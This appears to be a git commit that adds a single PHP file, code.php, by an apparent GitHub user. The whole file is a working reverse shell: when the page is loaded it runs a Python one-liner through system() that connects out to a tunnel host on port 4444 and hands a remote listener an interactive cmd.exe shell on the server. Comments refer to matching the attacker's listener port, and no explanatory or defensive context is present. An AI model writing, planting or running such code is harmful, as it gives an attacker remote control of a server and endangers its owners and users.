e70106f0f2b2a316ce679fc5d07cc49a06f9042e
Zzscript <147871556+antonysimoncodes@users.noreply.github.com>
2025-08-18 22:25:00 +0530

    code.php

---
+++ code.php
@@ -0,0 +1,14 @@
+<?php
+$domain = '157d3e48113727.lhr.life'; // use the domain name
+$port = 4444; // must match your listener port
+
+$cmd = "python -c \"import socket,subprocess,os;" .
+       "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" .
+       "s.connect(('$domain',$port));" .
+       "os.dup2(s.fileno(),0);" .
+       "os.dup2(s.fileno(),1);" .
+       "os.dup2(s.fileno(),2);" .
+       "subprocess.call(['cmd.exe'])\"";
+
+system($cmd);
+?>
